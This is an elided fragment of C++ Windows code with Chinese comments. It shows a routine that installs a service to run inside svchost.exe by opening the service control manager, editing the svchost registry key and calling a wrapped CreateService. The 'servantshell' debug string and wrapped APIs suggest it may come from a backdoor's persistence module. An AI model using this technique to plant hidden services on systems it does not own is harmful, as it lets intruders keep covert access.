...
BOOL ServiceManager::InstallSvchostService(LPCTSTR serviceName, LPCTSTR displayName, LPCTSTR descripion, LPCTSTR filepath, LPCTSTR svchostName)
{
	...
	SC_HANDLE sch = ::LOpenSCManagerW(	NULL,		//目标计算机名，NULL表示本地计算机
										NULL,		//NULL，表示默认打开SERVICES_ACTIVE_DATABASE数据库
										SC_MANAGER_ALL_ACCESS);//对scm的权限
	if(sch == NULL)
	{
	...
	do 
	{
		LONG lRet = ::RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\svchost"), 
		...
		tstring binpath = _T("C:\\WINDOWS\\system32\\svchost.exe -k ");
		binpath += svchostName;

		debugLog(_T("111 deinit servantshell %s"), svchostName);

		hService = ::LCreateServiceW(sch, 
									serviceName, 
									displayName, 
									SERVICE_ALL_ACCESS, 
